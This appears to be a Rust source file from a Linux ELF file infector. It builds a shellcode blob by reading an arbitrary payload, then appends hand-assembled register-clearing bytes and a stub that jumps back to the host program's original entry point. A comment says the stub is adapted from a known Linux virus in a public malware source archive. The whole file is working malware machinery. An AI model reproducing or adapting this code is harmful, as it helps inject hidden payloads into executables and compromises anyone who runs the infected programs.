use std::io::SeekFrom;

pub struct Shellcode {
    pub code: Vec<u8>,
}

impl Shellcode {
    pub fn new<T>(
        mut rdr: T,
        new_entry_point: u64,
        old_entry_point: u64,
    ) -> Result<Self, Box<dyn std::error::Error>>
    where
        T: std::io::Read + std::io::Seek,
    {
        let mut code = Vec::<u8>::new();
        rdr.seek(SeekFrom::Start(0))?;
        rdr.read_to_end(&mut code)?;
        let length = code.len() as u64;
        code.extend(Self::clean_reg());
        code.extend(Self::ret_2_oep(length, new_entry_point, old_entry_point));

        Ok(Self { code })
    }

    pub fn clean_reg() -> Vec<u8> {
        vec![0x48, 0x31, 0xd2, 0x48, 0x31, 0xed]
    }

    pub fn ret_2_oep(length: u64, new_entry_point: u64, old_entry_point: u64) -> Vec<u8> {
        // based on https://github.com/vxunderground/MalwareSourceCode/blob/17767b1689d85ee35d426cc58feaa5020e6c32cf/VXUG/Linux.Kropotkine.asm#L269

        let mut patched = Vec::new();

        patched.extend([0xe8, 0x2d, 0x00, 0x00, 0x00, 0x49, 0xb9]);
        patched.extend(length.to_ne_bytes());
        patched.extend([0x49, 0xba]);
        patched.extend(new_entry_point.to_ne_bytes());
        patched.extend([0x49, 0xbb]);
        patched.extend(old_entry_point.to_ne_bytes());
        patched.extend([
            0x4c, 0x29, 0xc8, 0x48, 0x83, 0xe8, 0x05, 0x4c, 0x29, 0xd0, 0x4c, 0x01, 0xd8, 0xff,
            0xe0, 0x48, 0x8b, 0x04, 0x24, 0xc3,
        ]);
        patched
    }

    pub fn as_slice(&self) -> &[u8] {
        self.code.as_slice()
    }
}
